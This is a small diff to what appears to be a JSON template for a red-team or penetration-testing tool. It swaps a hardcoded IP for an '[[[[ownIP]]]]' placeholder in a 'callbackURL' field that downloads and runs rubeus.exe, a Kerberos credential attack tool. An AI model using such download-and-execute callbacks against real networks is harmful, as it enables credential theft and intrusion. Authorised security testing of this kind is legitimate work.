@@ -9,7 +9,7 @@
         {
             "name": "callbackURL",
             "description": "Executable will call back and execute the executable here.",
-            "defaultValue": "http://192.168.45.205/tools/rubeus.exe"
+            "defaultValue": "http://[[[[ownIP]]]]/tools/rubeus.exe"
         },
         {
             "name" : "commandlineArguments",
